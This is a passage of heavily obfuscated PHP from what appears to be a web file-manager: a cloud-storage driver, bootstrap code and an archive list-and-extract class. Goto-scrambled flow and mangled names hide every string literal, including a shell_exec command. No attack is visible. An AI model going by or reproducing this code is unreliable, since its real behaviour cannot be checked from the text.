rawurlencode($fçá¶¬ä†ì), $fµã•Çúã«[202] => $C∆Ç™∂Ô∫ô); goto FÙ◊Ö“∆∂•; FÙ◊Ö“∆∂•: $C‹⁄ÌØÃ»’ = $this->link($eî ìÑê«ƒ, $Dü…“≈“§‚); $this->fileOutLink($C‹⁄ÌØÃ»’); goto Cû®≈öû∫Ø; Cû®≈öû∫Ø: } public function fileOutServer($CñíÍﬂïﬁ◊, $E“ﬂã…Æàæ = false, $DáËûÊÆ“Ù = false, $Dê„Ô∑‹ìÚ = '') { parent::fileOut($CñíÍﬂïﬁ◊, $E“ﬂã…Æàæ, $DáËûÊÆ“Ù, $Dê„Ô∑‹ìÚ); } public function fileOutImage($aß√◊±Öçø, $d£õ·ó⁄€ƒ = 250) { $C≠¯‰–∂ÆÀ = $this->link($aß√◊±Öçø); $this->fileOutLink($C≠¯‰–∂ÆÀ); } public function fileOutImageServer($fŒ≥çáÑâÖ, $eΩ§ÊµŒ∑ç = 250) { parent::fileOutImage($fŒ≥çáÑâÖ, $eΩ§ÊµŒ∑ç); } public function hashMd5($b¬·ì∆è¢ñ, $BëƒÃ¬Ö∂ü = '') { $déö∑ù◊Âå =& $_SERVER[¯èãÄπµ]; $B∞¯û√Ÿ’´ = $this->objectMeta($b¬·ì∆è¢ñ); if (!$B∞¯û√Ÿ’´) { return !1; } $BëƒÃ¬Ö∂ü = $BëƒÃ¬Ö∂ü ? $BëƒÃ¬Ö∂ü : _get($B∞¯û√Ÿ’´, $déö∑ù◊Âå[203]); $BëƒÃ¬Ö∂ü = $BëƒÃ¬Ö∂ü ? $BëƒÃ¬Ö∂ü : _get($B∞¯û√Ÿ’´, $déö∑ù◊Âå[193], $déö∑ù◊Âå[33]); return $BëƒÃ¬Ö∂ü; } public function uploadFormData($Eó‰ıîâÖÙ, $bà™°õ≤–æ = 3600) { $D≤öõΩÜî´ =& $_SERVER[¯èãÄπµ]; $e™—»Üú‘ = $this->pathFather($Eó‰ıîâÖÙ); $A†“∏œ›’· = $this->client->getHttpUploadPostParams($this->bucket, $e™—»Üú‘, $D≤öõΩÜî´[181], $bà™°õ≤–æ); return array_merge((array) $A†“∏œ›’·, array($D≤öõΩÜî´[165] => $this->getHost())); } public function multiUploadFormData($Fó√®ã∂»ä, $d∫û†ÿß˜÷ = 3600) { $fƒ£‹·›ë =& $_SERVER[¯èãÄπµ]; $dƒÖÜ„€∂’ = gmdate($fƒ£‹·›ë[204]); $dπÍÌ‘¬ˆ≈ = array(); $e∂∑éôèêﬂ = $this->client->getUploadId($this->bucket, $Fó√®ã∂»ä, $dπÍÌ‘¬ˆ≈); if (!$e∂∑éôèêﬂ) { return !1; } return array($fƒ£‹·›ë[205] => $e∂∑éôèêﬂ, $fƒ£‹·›ë[165] => $this->getHost() . $fƒ£‹·›ë[8] . $this->pathEncode($Fó√®ã∂»ä), $fƒ£‹·›ë[206] => $dƒÖÜ„€∂’, $fƒ£‹·›ë[89] => $Fó√®ã∂»ä); } public function multiUploadAuthData($cËÕÏÆ™Ωé, $Dàâ∆â·Õ≥ = array()) { goto f«Ô≥∆Ã‚ÿ; f«Ô≥∆Ã‚ÿ: $AÍ»äÇÙÁû =& $_SERVER[¯èãÄπµ]; $EΩÕËåØå∞ = isset($Dàâ∆â·Õ≥[$AÍ»äÇÙÁû[206]]) ? $Dàâ∆â·Õ≥[$AÍ»äÇÙÁû[206]] : gmdate($AÍ»äÇÙÁû[204]); $BöíßØ´ä¬ = isset($Dàâ∆â·Õ≥[$AÍ»äÇÙÁû[156]]) ? $Dàâ∆â·Õ≥[$AÍ»äÇÙÁû[156]] : $AÍ»äÇÙÁû[33]; goto dã¯Âò‹õ◊; AÛÓóáÛå’: $aåî°¿ÁÇã = implode($AÍ»äÇÙÁû[213], $Bªú“ù⁄Æº); $bÆë’∑¥ÃÛ = base64_encode(hash_hmac($AÍ»äÇÙÁû[214], $aåî°¿ÁÇã, $this->secret, !0)); $cáª◊ô‡∑å = $AÍ»äÇÙÁû[215] . $this->accessKey . $AÍ»äÇÙÁû[4] . $bÆë’∑¥ÃÛ; goto b£¬ö‡¨çè; dã¯Âò‹õ◊: $bå´Æáƒë∞ = $Dàâ∆â·Õ≥[$AÍ»äÇÙÁû[89]]; unset($Dàâ∆â·Õ≥[$AÍ»äÇÙÁû[89]]); if (isset($Dàâ∆â·Õ≥[$AÍ»äÇÙÁû[207]])) { $Dàâ∆â·Õ≥[$AÍ»äÇÙÁû[206]] = $EΩÕËåØå∞; return $this->listUploadParts($bå´Æáƒë∞, $Dàâ∆â·Õ≥); } goto D€∏åÒÿÜæ; D€∏åÒÿÜæ: $Bªú“ù⁄Æº = array($AÍ»äÇÙÁû[208], $AÍ»äÇÙÁû[33], $AÍ»äÇÙÁû[115], $AÍ»äÇÙÁû[33], "\170\x2d\x61\155\172\x2d\144\141\x74\145\72{$EΩÕËåØå∞}", $AÍ»äÇÙÁû[8] . $this->bucket . $AÍ»äÇÙÁû[8] . $this->pathEncode($bå´Æáƒë∞) . $BöíßØ´ä¬); if (strpos($BöíßØ´ä¬, $AÍ»äÇÙÁû[209]) === 0) { $Bªú“ù⁄Æº[0] = $AÍ»äÇÙÁû[210]; } if (isset($Dàâ∆â·Õ≥[$AÍ»äÇÙÁû[211]]) && $Dàâ∆â·Õ≥[$AÍ»äÇÙÁû[211]] == $AÍ»äÇÙÁû[212]) { $Bªú“ù⁄Æº[0] = $AÍ»äÇÙÁû[212]; } goto AÛÓóáÛå’; b£¬ö‡¨çè: if (strpos($BöíßØ´ä¬, $AÍ»äÇÙÁû[209]) === 0) { return array($AÍ»äÇÙÁû[216] => $cáª◊ô‡∑å, $AÍ»äÇÙÁû[206] => $EΩÕËåØå∞); } return $cáª◊ô‡∑å; goto EƒÆÆËÍÇ; EƒÆÆËÍÇ: } public function listUploadParts($Bùöô˜»Î∫, $FÉÚŸñÒ†ª = array()) { goto A¥ô¶´ö÷ã; Eú—ç»Úã: $d≈∂Ω¡éŒ» = $this->multiUploadAuthData($Bùöô˜»Î∫, $FÉÚŸñÒ†ª); if (empty($d≈∂Ω¡éŒ»)) { return !1; } return array($eó≈≥ÓÂ∑ﬁ[216] => $d≈∂Ω¡éŒ», $eó≈≥ÓÂ∑ﬁ[206] => $FÉÚŸñÒ†ª[$eó≈≥ÓÂ∑ﬁ[206]], $eó≈≥ÓÂ∑ﬁ[218] => $E‘¡‹Ïéá⁄); goto fÊáßÿ–°°; A¥ô¶´ö÷ã: $eó≈≥ÓÂ∑ﬁ =& $_SERVER[¯èãÄπµ]; $CÊ∏ô«ıèõ = str_replace($eó≈≥ÓÂ∑ﬁ[217], $eó≈≥ÓÂ∑ﬁ[33], $FÉÚŸñÒ†ª[$eó≈≥ÓÂ∑ﬁ[156]]); $E‘¡‹Ïéá⁄ = $this->client->listParts($this->bucket, $Bùöô˜»Î∫, $CÊ∏ô«ıèõ); goto E°í£üô™¿; E°í£üô™¿: if (!$E‘¡‹Ïéá⁄) { return !1; } unset($FÉÚŸñÒ†ª[$eó≈≥ÓÂ∑ﬁ[207]], $FÉÚŸñÒ†ª[$eó≈≥ÓÂ∑ﬁ[211]]); $FÉÚŸñÒ†ª[$eó≈≥ÓÂ∑ﬁ[89]] = $Bùöô˜»Î∫; goto Eú—ç»Úã; fÊáßÿ–°°: } public function getHost() { return parent::getHost() . $_SERVER[¯èãÄπµ][8] . $this->bucket; } public function size($Dì∏åô–ç„) { $aàåÍÚ±ü§ = $this->objectMeta($Dì∏åô–ç„); return $aàåÍÚ±ü§ ? $aàåÍÚ±ü§[$_SERVER[¯èãÄπµ][77]] : 0; } public function info($A—‹¶ù®Òã) { if ($this->isFolder($A—‹¶ù®Òã)) { return $this->folderInfo($A—‹¶ù®Òã); } else { if ($this->isFile($A—‹¶ù®Òã)) { return $this->fileInfo($A—‹¶ù®Òã); } } return !1; } public function exist($bË∫≠≥Öè∏) { return $this->isFile($bË∫≠≥Öè∏) || $this->isFolder($bË∫≠≥Öè∏); } public function isFile($FÏ «ı⁄©¡) { return !$this->isFolder($FÏ «ı⁄©¡) && $this->objectMeta($FÏ «ı⁄©¡); } public function isFolder($FØ°ÿÑÑ¬Ó) { return $this->cacheMethod($_SERVER[¯èãÄπµ][219], $FØ°ÿÑÑ¬Ó); } protected function objectMeta($c›≥•ÔÓÎï) { return $this->cacheMethod($_SERVER[¯èãÄπµ][220], $c›≥•ÔÓÎï); } protected function _objectMeta($CéÑ’Ô¢Í›) { $dƒ◊ª„“ƒ¯ =& $_SERVER[¯èãÄπµ]; $CéÑ’Ô¢Í› = rtrim($CéÑ’Ô¢Í›, $dƒ◊ª„“ƒ¯[8]); try { $fôõ∞ÇíÙπ = $this->client->getObjectInfo($this->bucket, $CéÑ’Ô¢Í›); if (!isset($fôõ∞ÇíÙπ[$dƒ◊ª„“ƒ¯[203]]) && isset($fôõ∞ÇíÙπ[$dƒ◊ª„“ƒ¯[221]])) { $fôõ∞ÇíÙπ[$dƒ◊ª„“ƒ¯[203]] = $fôõ∞ÇíÙπ[$dƒ◊ª„“ƒ¯[221]]; } } catch (OSS\Core\OssException $Eå‹®Ñ∏ æ) { $fôõ∞ÇíÙπ = !1; } if (!$fôõ∞ÇíÙπ) { } return $fôõ∞ÇíÙπ; } protected function _isFolder($EóëıãâéÃ) { goto Bèã¬´ø¢†; Bèã¬´ø¢†: $eœ™´ èöÊ =& $_SERVER[¯èãÄπµ]; $EóëıãâéÃ = rtrim($EóëıãâéÃ, $eœ™´ èöÊ[8]); if ($EóëıãâéÃ == $eœ™´ èöÊ[33] || $EóëıãâéÃ == $eœ™´ èöÊ[8]) { return !0; } goto eœÑòµÚ„ë; eœÑòµÚ„ë: $d¶˘¨∞‚ﬁë = $this->client->getBucket($this->bucket, $EóëıãâéÃ, null, 1); if (empty($d¶˘¨∞‚ﬁë)) { return !1; } $d¶˘¨∞‚ﬁë = array_values($d¶˘¨∞‚ﬁë); goto båã∫êÂá ; båã∫êÂá : if (substr($d¶˘¨∞‚ﬁë[0][$eœ™´ èöÊ[28]], -1) == $eœ™´ èöÊ[8]) { return !0; } if (get_path_this($d¶˘¨∞‚ﬁë[0][$eœ™´ èöÊ[28]]) == get_path_this($EóëıãâéÃ)) { return !1; } return !0; goto F∞ﬁ√‰à⁄¿; F∞ﬁ√‰à⁄¿: } } define($_SERVER[¯èãÄπµ][222], 1); goto bÚ€ùï‹ûå; C†ë∏†Ïı: function beforeShutdown() { Hook::trigger($_SERVER[ÎÏ°ﬂ±å][36]); } $_SERVER[$_SERVER[ÎÏ°ﬂ±å][37]] = BASIC_PATH; $_SERVER[$_SERVER[ÎÏ°ﬂ±å][38]] = LIB_DIR; goto CÆ⁄·ãÉ¯√; BﬁÂÍΩâ¿•: define($_SERVER[¯èãÄπµ][1919], 5); define($_SERVER[¯èãÄπµ][1920], 16); define($_SERVER[¯èãÄπµ][1921], 32); goto F∞ßÈ≈åÌö; e„Á¥Á≈å≤: register_shutdown_function($_SERVER[ÎÏ°ﬂ±å][36]); set_error_handler($_SERVER[ÎÏ°ﬂ±å][49], $f∂ø–º◊∞å); if (function_exists($_SERVER[ÎÏ°ﬂ±å][50])) { set_exception_handler($_SERVER[ÎÏ°ﬂ±å][51]); } goto Fë•´∆Æã⁄; AÁò≠ì¥∆: define($_SERVER[¯èãÄπµ][0], $_SERVER[¯èãÄπµ][1]); $_SERVER[ÎÏ°ﬂ±å] = explode($_SERVER[¯èãÄπµ][2], gzinflate(substr($_SERVER[¯èãÄπµ][3], 10, -8))); function Model($C™∑‘Ù™»ﬂ = '', $BÇµ‹œõ¢á = '', $A∫ñ§ó‘ ∏ = '') { goto c€Ï⁄¬‰Ï≠; Aì£¬ÇÜ˘¡: if (isset($b∆á∏—î„ö[$CŒ◊íÀé®◊])) { return $b∆á∏—î„ö[$CŒ◊íÀé®◊]; } if ($C™∑‘Ù™»ﬂ) { $C™∑‘Ù™»ﬂ = strtoupper($C™∑‘Ù™»ﬂ[0]) . substr($C™∑‘Ù™»ﬂ, 1); $b≤µÇâ”⁄ù = $C™∑‘Ù™»ﬂ . $D≠‹ã“ÁÇó[1]; if (class_exists($b≤µÇâ”⁄ù)) { $b∆á∏—î„ö[$CŒ◊íÀé®◊] = new $b≤µÇâ”⁄ù(); return $b∆á∏—î„ö[$CŒ◊íÀé®◊]; } } if (!$A∫ñ§ó‘ ∏) { $A∫ñ§ó‘ ∏ = $GLOBALS[$D≠‹ã“ÁÇó[2]][$D≠‹ã“ÁÇó[3]]; } goto E¨ÑÆµ◊éÌ; E¨ÑÆµ◊éÌ: $b∆á∏—î„ö[$CŒ◊íÀé®◊] = new ModelBase($C™∑‘Ù™»ﬂ, $BÇµ‹œõ¢á, $A∫ñ§ó‘ ∏); return $b∆á∏—î„ö[$CŒ◊íÀé®◊]; goto EŒä∫ ∂´ä; c€Ï⁄¬‰Ï≠: $D≠‹ã“ÁÇó =& $_SERVER[ÎÏ°ﬂ±å]; static $b∆á∏—î„ö = array(); $CŒ◊íÀé®◊ = strtolower($BÇµ‹œõ¢á . $D≠‹ã“ÁÇó[0] . $C™∑‘Ù™»ﬂ); goto Aì£¬ÇÜ˘¡; EŒä∫ ∂´ä: } goto aõÑÙî¨ÿπ; c•ÙóÂÒª‰: class KodArchive { static function init() { goto d·àõ∑√πú; F‰πÃá’Ü¢: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $Dƒ¬¬èËê[1875]; require_once ARCHIVE_LIB . $Dƒ¬¬èËê[1876]; goto dØ·£ò’£¯; F¢Ω∫…à®Æ: define($Dƒ¬¬èËê[1871], TEMP_FILES); define($Dƒ¬¬èËê[1872], TEMP_FILES); define($Dƒ¬¬èËê[1873], $Dƒ¬¬èËê[1874]); goto F‰πÃá’Ü¢; FÊÜÉÂ≤◊¿: require_once ARCHIVE_LIB . $Dƒ¬¬èËê[1880]; goto c∞π®¨≥Ò›; dØ·£ò’£¯: require_once ARCHIVE_LIB . $Dƒ¬¬èËê[1877]; require_once ARCHIVE_LIB . $Dƒ¬¬èËê[1878]; require_once ARCHIVE_LIB . $Dƒ¬¬èËê[1879]; goto FÊÜÉÂ≤◊¿; d·àõ∑√πú: $Dƒ¬¬èËê =& $_SERVER[¯èãÄπµ]; if (defined($Dƒ¬¬èËê[1869])) { return; } define($Dƒ¬¬èËê[1869], SDK_DIR . $Dƒ¬¬èËê[1870]); goto F¢Ω∫…à®Æ; c∞π®¨≥Ò›: } static function checkIfType($Cû‚Õÿ†‘¨, $CÖ∑≈›≥øÃ) { goto bââÎÖç‚ó; Fôß¡É¿°°: return $dëëœ∞óæÇ; goto cÎ˘∆Ÿ®ì≈; bââÎÖç‚ó: $Cïç·û◊πã =& $_SERVER[¯èãÄπµ]; self::init(); $Föà‰„Á»Ω = array($Cïç·û◊πã[297] => array($Cïç·û◊πã[297], $Cïç·û◊πã[1881], $Cïç·û◊πã[1882], $Cïç·û◊πã[1883]), $Cïç·û◊πã[1884] => array($Cïç·û◊πã[1884], $Cïç·û◊πã[1885], $Cïç·û◊πã[1045], $Cïç·û◊πã[1043]), $Cïç·û◊πã[1047] => array($Cïç·û◊πã[1047], $Cïç·û◊πã[1886], $Cïç·û◊πã[1887], $Cïç·û◊πã[1888], $Cïç·û◊πã[1889], $Cïç·û◊πã[1890], $Cïç·û◊πã[1891])); goto A èÃæÊ™Â; A èÃæÊ™Â: $dëëœ∞óæÇ = in_array($Cû‚Õÿ†‘¨, $Föà‰„Á»Ω[$CÖ∑≈›≥øÃ]); if ($dëëœ∞óæÇ && ($CÖ∑≈›≥øÃ == $Cïç·û◊πã[297] || $CÖ∑≈›≥øÃ == $Cïç·û◊πã[1884]) && (!function_exists($Cïç·û◊πã[1892]) || !function_exists($Cïç·û◊πã[1893]))) { show_tips($Cïç·û◊πã[1894]); } if ($dëëœ∞óæÇ && $CÖ∑≈›≥øÃ == $Cïç·û◊πã[1047] && (!function_exists($Cïç·û◊πã[1895]) || !strstr(shell_exec($Cïç·û◊πã[1896]), $Cïç·û◊πã[1897]))) { show_tips($Cïç·û◊πã[1898]); } goto Fôß¡É¿°°; cÎ˘∆Ÿ®ì≈: } static function listContent($A·§ïé·–, $e≈„æÁÃÏû = true) { $fèó“ùËÎÁ =& $_SERVER[¯èãÄπµ]; self::init(); $A‰…ÿÆôäç = !empty($GLOBALS[$fèó“ùËÎÁ[1051]]) ? $GLOBALS[$fèó“ùËÎÁ[1051]] : get_path_ext($A·§ïé·–); $bÜàΩ´ÿÁ¿ = !1; if (self::checkIfType($A‰…ÿÆôäç, $fèó“ùËÎÁ[1884])) { $D¢ÇΩú´ùƒ = PclTarList($A·§ïé·–, $A‰…ÿÆôäç); $bÜàΩ´ÿÁ¿ = array(); for ($C¬ê∞‹«…Û = 0; $C¬ê∞‹«…Û < count($D¢ÇΩú´ùƒ); $C¬ê∞‹«…Û++) { $e¶§—ˆ∏ÃÀ = $D¢ÇΩú´ùƒ[$C¬ê∞‹«…Û]; if ($e¶§—ˆ∏ÃÀ[$fèó“ùËÎÁ[1899]] == $fèó“ùËÎÁ[1900] || $e¶§—ˆ∏ÃÀ[$fèó“ùËÎÁ[1899]] == $fèó“ùËÎÁ[1901]) { continue; } if ($e≈„æÁÃÏû) { $e¶§—ˆ∏ÃÀ[$fèó“ùËÎÁ[1902]] = ltrim($e¶§—ˆ∏ÃÀ[$fèó“ùËÎÁ[1902]], $fèó“ùËÎÁ[1149]); } if ($e¶§—ˆ∏ÃÀ[$fèó“ùËÎÁ[1899]] == $fèó“ùËÎÁ[1903]) { $e¶§—ˆ∏ÃÀ[$fèó“ùËÎÁ[76]] = !0; } else { $e¶§—ˆ∏ÃÀ[$fèó“ùËÎÁ[76]] = !1; } $e¶§—ˆ∏ÃÀ[$fèó“ùËÎÁ[1038]] = $C¬ê∞‹«…Û; $bÜàΩ´ÿÁ¿[] = $e¶§—ˆ∏ÃÀ; } } else { if (self::checkIfType($A‰…ÿÆôäç, $fèó“ùËÎÁ[1047])) { $d≠§ï©Æê◊ = kodRarArchive::listContent($A·§ïé·–); if (!$d≠§ï©Æê◊[$fèó“ùËÎÁ[1034]]) { return $d≠§ï©Æê◊; } else { $bÜàΩ´ÿÁ¿ = $d≠§ï©Æê◊[$fèó“ùËÎÁ[1036]]; } } else { if (kodZipArchive::support($fèó“ùËÎÁ[350])) { $bÜàΩ´ÿÁ¿ = kodZipArchive::listContent($A·§ïé·–); } else { $C‘À§úËòÁ = new PclZip($A·§ïé·–); $bÜàΩ´ÿÁ¿ = $C‘À§úËòÁ->listContent(); } } } if ($bÜàΩ´ÿÁ¿) { $dß’æÇøôˆ = unzip_charset_get($bÜàΩ´ÿÁ¿); $e≈„æÁÃÏû = $e≈„æÁÃÏû && function_exists($fèó“ùËÎÁ[65]); for ($C¬ê∞‹«…Û = 0; $C¬ê∞‹«…Û < count($bÜàΩ´ÿÁ¿); $C¬ê∞‹«…Û++) { $bÜàΩ´ÿÁ¿[$C¬ê∞‹«…Û][$fèó“ùËÎÁ[1902]] = str_replace(array($fèó“ùËÎÁ[1074], $fèó“ùËÎÁ[1904]), $fèó“ùËÎÁ[765], $bÜàΩ´ÿÁ¿[$C¬ê∞‹«…Û][$fèó“ùËÎÁ[1902]]); if ($e≈„æÁÃÏû) { $bÜàΩ´ÿÁ¿[$C¬ê∞‹«…Û][$fèó“ùËÎÁ[1902]] = iconv_to($bÜàΩ´ÿÁ¿[$C¬ê∞‹«…Û][$fèó“ùËÎÁ[1902]], $dß’æÇøôˆ, $fèó“ùËÎÁ[322]); unset($bÜàΩ´ÿÁ¿[$C¬ê∞‹«…Û][$fèó“ùËÎÁ[1905]]); } } return array($fèó“ùËÎÁ[1034] => !0, $fèó“ùËÎÁ[1036] => $bÜàΩ´ÿÁ¿); } else { return array($fèó“ùËÎÁ[1034] => !1, $fèó“ùËÎÁ[1036] => $bÜàΩ´ÿÁ¿); } } static function extract($A”Ëã«ñ§è, $F¶ÀˆÂÖ›õ, $F∏›ùßÜ¨© = "\x2d\x31", &$Bß˜¡ﬂ⁄ãë = false) { goto Aûé∑•¿ÎØ; Aûé∑•¿ÎØ: $bÆê™‹°™ƒ =& $_SERVER[¯èãÄπµ]; self::init(); $Fê¡ﬂÑ∏Ñ = !empty($GLOBALS[$bÆê™‹°™ƒ[1051]]) ? $GLOBALS[$bÆê™‹°™ƒ[1051]] : get_path_ext($A”Ëã«ñ§è); goto Fﬁî¯åºì¯; Fﬁî¯åºì¯: $c—¥¬ˆ‹∞√ = self::listContent($A”Ëã«ñ§è, !1); if (!$c—¥¬ˆ‹∞√[$bÆê™‹°™ƒ[1034]]) { return $c—¥¬ˆ‹∞√; } if ($F∏›ùßÜ¨© != $bÆê™‹°™ƒ[1033]) { goto a˘ƒ∞Û‚ä†; B≈ßˆŸ·≈‹: if ($dÇ¢Ö‡ØÒ≥[$bÆê™‹°™ƒ[76]]) { $bÉÎ≈≠‡‚ù = rtrim($bÉÎ≈≠‡‚ù, $bÆê™‹°™ƒ[8]) . $bÆê™‹°™ƒ[8]; $Bß˜¡ﬂ⁄ãë = array($Bß˜¡ﬂ⁄ãë); } $E√Á‹‹ﬂñÔ = str_replace($bÆê™‹°™ƒ[93], $bÆê™‹°™ƒ[8], $bÉÎ≈≠‡‚ù); if (substr($E√Á‹‹ﬂñÔ, -1) == $bÆê™‹°™ƒ[8]) { if (!strstr(trim($E√Á‹‹ﬂñÔ, $bÆê™‹°™ƒ[8]), $bÆê™‹°™ƒ[8])) { $F¶ÀˆÂÖ›õ = $F¶ÀˆÂÖ›õ . get_path_this($E√Á‹‹ﬂñÔ) . $bÆê™‹°™ƒ[8]; } } else { if ($DåÜ™õ„«† == $bÉÎ≈≠‡‚ù) { $DåÜ™õ„«† = $bÆê™‹°™ƒ[33]; } } goto B…é‡€êÉê; a˘ƒ∞Û‚ä†: $dÇ¢Ö‡ØÒ≥ = self::fileIndex($c—¥¬ˆ‹∞√[$bÆê™‹°™ƒ[1036]], $F∏›ùßÜ¨©); $Bß˜¡ﬂ⁄ãë = str_replace(array($bÆê™‹°™ƒ[1074], $bÆê™‹°™ƒ[1904]), $bÆê™‹°™ƒ[70], $dÇ¢Ö‡ØÒ≥[$bÆê™‹°™ƒ[1902]]); $bÉÎ≈≠‡‚ù = $Bß˜¡ﬂ⁄ãë; goto AÂ√·Õ¯ŸÈ; AÂ√·Õ¯ŸÈ: if ($GLOBALS[$bÆê™‹°™ƒ[6]][$bÆê™‹°™ƒ[1147]] != $bÆê™‹°™ƒ[322]) { $bÉÎ≈≠‡‚ù = unzip_pre_name($Bß˜¡ﬂ⁄ãë); } $DåÜ™õ„«† = get_path_father($Bß˜¡ﬂ⁄ãë); if ($DåÜ™õ„«† == $Bß˜¡ﬂ⁄ãë) { $DåÜ™õ„«† = $bÆê™‹°™ƒ[33]; } goto B≈ßˆŸ·≈‹; B…é‡€êÉê: } goto b†Çïå–Ô„; b†Çïå–Ô„: if (self::checkIfType($Fê¡ﬂÑ∏Ñ, $bÆê™‹°™ƒ[1884])) { if ($F∏›ùßÜ¨© != $bÆê™‹°™ƒ[1033]) { $bÉÎ≈≠‡‚ù = unzip_pre_name($bÉÎ≈≠‡‚ù); $DåÜ™õ„«† = unzip_pre_name($DåÜ™õ„«†); $e‘Ëìíƒ¶∑ = PclTarExtractList($A”Ëã«ñ§è, array($bÉÎ≈≠‡‚ù), $F¶ÀˆÂÖ›õ, $DåÜ™õ„«†, $Fê¡ﬂÑ∏Ñ); } else { $e‘Ëìíƒ¶∑ = PclTarExtract($A”Ëã«ñ§è, $F¶ÀˆÂÖ›õ, $bÆê™‹°™ƒ[357], $Fê¡ﬂÑ∏Ñ); } return array($bÆê™‹°™ƒ[1034] => $e‘Ëìíƒ¶∑, $bÆê™‹°™ƒ[1036] => PclErrorString(!0)); } else { if (self::checkIfType($Fê¡ﬂÑ∏Ñ, $bÆê™‹°™ƒ[1047])) { return kodRarArchive::extract($A”Ëã«ñ§è, $F¶ÀˆÂÖ›õ, $Fê¡ﬂÑ∏Ñ, $Bß˜¡ﬂ⁄ãë); } else { if (kodZipArchive::support($bÆê™‹°™ƒ[1906])) { return kodZipArchive::extract($A”Ëã«ñ§è, $F¶ÀˆÂÖ›õ, $Bß˜¡ﬂ⁄ãë); } else { $dƒ¬õ»Î¥Ê = new PclZip($A”Ëã«ñ§è); if ($F∏›ùßÜ¨© != $bÆê™‹°™ƒ[1033]) { $e‘Ëìíƒ¶∑ = $dƒ¬õ»Î¥Ê->extract(PCLZIP_OPT_PATH, $F¶ÀˆÂÖ›õ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $bÆê™‹°™ƒ[1907], PCLZIP_OPT_BY_NAME, $dÇ¢Ö‡ØÒ≥[$bÆê™‹°™ƒ[1902]], PCLZIP_OPT_REMOVE_PATH, $DåÜ™õ„«†, PCLZIP_OPT_REPLACE_NEWER); } else { $e‘Ëìíƒ¶∑ = $dƒ¬õ»Î¥Ê->extract(PCLZIP_OPT_PATH, $F¶ÀˆÂÖ›õ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $bÆê™‹°™ƒ[1907], PCLZIP_OPT_REPLACE_NEWER); } return array($bÆê™‹°™ƒ[1034] => $e‘Ëìíƒ¶∑, $bÆê™‹°™ƒ[1036] => $dƒ¬õ»Î¥Ê->errorName(!0)); } } } return array($bÆê™‹°™ƒ[1034] => !1, $bÆê™‹°™ƒ[1036] => $bÆê™‹°™ƒ[1908]); goto Eª©∫ÇÌûÁ; Eª©∫ÇÌûÁ: } static function fileIndex($BÙùëû»à©, $FÛ¯⁄çéÁ«, $Eò◊ï®™π• = false) { goto C¢äƒ˘´®˜; eõ…ÆÍë∫ƒ: $b¨Œ‰»ÕÕƒ = $Fœ˘ßëÛ∏; if ($Eò◊ï®™π•) { $b¨Œ‰»ÕÕƒ = $Fœ˘ßëÛ∏[$Eò◊ï®™π•]; if ($Fœ˘ßëÛ∏[$c›Ã”‹ﬁáó[76]]) { $b¨Œ‰»ÕÕƒ = rtrim($b¨Œ‰»ÕÕƒ, $c›Ã”‹ﬁáó[8]) . $c›Ã”‹ﬁáó[8]; } } return $b¨Œ‰»ÕÕƒ; goto BﬂÛ‚üÿ»œ; C¢äƒ˘´®˜: $c›Ã”‹ﬁáó =& $_SERVER[¯èãÄπµ]; self::init(); if (!is_array($BÙùëû»à©)) { return !1; } goto c¥ÛÌ∑ü≤Œ; c¥ÛÌ∑ü≤Œ: $Eçê∂è¡Îè = count($BÙùëû»à©); for ($F∆·ÈôëƒÈ = 0; $F∆·ÈôëƒÈ < $Eçê∂è¡Îè; $F∆·ÈôëƒÈ++) { if ($FÛ¯⁄çéÁ« == $BÙùëû»à©[$F∆·ÈôëƒÈ][$c›Ã”‹ﬁáó[1038]]) { $Fœ˘ßëÛ∏ = $BÙùëû»à©[$F∆·ÈôëƒÈ]; break; } } if (!$Fœ˘ßëÛ∏) { show_tips($c›Ã”‹ﬁáó[1909]); } goto eõ…ÆÍë∫ƒ; BﬂÛ‚üÿ»œ: } static function extractZipFile($cÑÇ‚À”≠“, $F„’ÙäÌô‰, $FÊü∑µºˆ± = false) { goto Dº§ç™°äô; DÀ‘«á—≠„: if (file_exists($b „ÆŒ ñÊ)) { return $b „ÆŒ ñÊ; } $BÌÒ“ŸÜÑ÷ = new PclZip($cÑÇ‚À”≠“); $FíÜ†£ÁÌç = unzip_filter_ext($d°í≠±ãœπ . get_path_this($F„’ÙäÌô‰)); goto Cùçû´–ãƒ; Cùçû´–ãƒ: $cáÜ»ò™µ¢ = get_path_father($F„’ÙäÌô‰); if ($cáÜ»ò™µ¢ == $F„’ÙäÌô‰) { $cáÜ»ò™µ¢ = $Fïó£‹òòÿ[33]; } $aˆ≈Ø√Üàœ = $BÌÒ“ŸÜÑ÷->extract(PCLZIP_OPT_PATH, $d°í≠±ãœπ, PCLZIP_CB_PRE_FILE_NAME, $Fïó£‹òòÿ[1907], PCLZIP_OPT_REMOVE_PATH, $cáÜ»ò™µ¢, PCLZIP_OPT_BY_NAME, $F„’ÙäÌô‰); goto b„Â¨ ∂î≤; Dº§ç™°äô: $Fïó£‹òòÿ =& $_SERVER[¯èãÄπµ]; self::init(); $d°í≠±ãœπ = TEMP_FILES . hash_path($cÑÇ‚À”≠“) . $Fïó£‹òòÿ[8]; goto C‡ˆÈÑŸ“ÿ; C‡ˆÈÑŸ“ÿ: mk_dir($d°í≠±ãœπ); $b „ÆŒ ñÊ = $d°í≠±ãœπ . md5($cÑÇ‚À”≠“ . $F„’ÙäÌô‰); if ($FÊü∑µºˆ±) { $b „ÆŒ ñÊ = $d°í≠±ãœπ . $FÊü∑µºˆ±; } goto DÀ‘«á—≠„; b„Â¨ ∂î≤: if (!file_exists($FíÜ†£ÁÌç)) { return !1; } @rename($FíÜ†£ÁÌç, $b „ÆŒ ñÊ); return $b „ÆŒ ñÊ; goto Cî…ºÙÂÿû; Cî…ºÙÂÿû: } static function filePreview($cä√ãÎÈ⁄ü, $dŸï„Îˆ·á, $EﬁŸã∫·≥Ó = false, $BõÖ‚‹Èº≈ = false) { goto f±ß’í∞¿Ç; eËÇûó» ´: $DóùÑÜêãÌ = unzip_pre_name($DóùÑÜêãÌ); $aì÷Ωê≠Ö = get_path_this($DóùÑÜêãÌ); $EﬁÔ›øÒ”¡ = unzip_filter_ext($dÖúêàıª . $aì÷Ωê≠Ö); goto Eª’πºÃËÛ; Eª’πºÃËÛ: if (!$CŸÖÑòÛÿΩ[$D™±Öàµâø[1034]]) { show_json($CŸÖÑòÛÿΩ[$D™±Öàµâø[1036]], !1); } if 